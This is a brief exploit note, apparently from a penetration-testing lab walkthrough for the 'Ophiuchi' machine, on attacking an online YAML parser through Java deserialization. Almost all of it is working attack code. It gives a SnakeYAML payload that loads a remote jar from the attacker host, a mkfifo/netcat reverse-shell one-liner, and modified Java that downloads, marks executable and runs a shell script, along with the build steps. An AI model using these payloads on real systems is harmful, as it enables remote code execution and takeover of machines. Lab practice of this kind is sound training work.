#### Online YAML parser
See [[Ophiuchi.pdf]]
See https://github.com/artsploit/yaml-payload
```bash - kali
git clone https://github.com/artsploit/yaml-payload
```
[[Python#Server]]
```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://$KALI/"]
  ]]
]
```
Should see a call back in you python server.
shell file:
```bash - kali
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f
```
Modify lines 8 - 17 of `/src/artsploit/AwesomeScriptEngineFactory.java` with the following to upload and execute reverse shell.
```java
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() throws Exception {
        try {
            Process p = Runtime.getRuntime().exec("wget $KALI/shell -O /tmp/shell");
			p.waitFor();
			p = Runtime.getRuntime().exec("chmod +x /tmp/shell");
			p.waitFor();
			p = Runtime.getRuntime().exec("/tmp/shell");
			p.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```
```bash - kali
javac src/artsploit/AwesomeScriptEngineFactory.java
```
```bash - kali
jar -cvf yaml-payload.jar -C src/ .
```
[[1._rlwrap]]
```bash - kali
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://$KALI/yaml-payload.jar"]
  ]]
]
```
